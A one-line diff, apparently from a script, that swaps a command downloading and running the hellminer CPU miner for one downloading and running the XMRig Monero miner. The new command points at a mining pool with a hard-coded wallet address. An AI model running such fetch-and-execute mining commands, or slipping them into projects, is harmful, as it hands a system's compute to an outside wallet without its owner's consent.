@@ -1,1 +1,1 @@
-wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xvf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://ap.luckpool.net:3960#xnsub -u RGSV74VaFDJM5Wxj1AfdRR5AYmBX23bk56.Test -p x --cpu 4
+wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-static-x64.tar.gz && tar xf xmrig-6.16.4-linux-static-x64.tar.gz && cd xmrig-6.16.4 && ./xmrig -o sg.minexmr.com:443 -u 84PaFenaQAZBeLCLdooJv3TQA9guadxquinwZGPFwyNENLXFG3a6jU6PimmFRjR2nZ2Nv1WRXUd3wVjQiWHCZBNNE8SqKiF -k --tls --rig-id Test
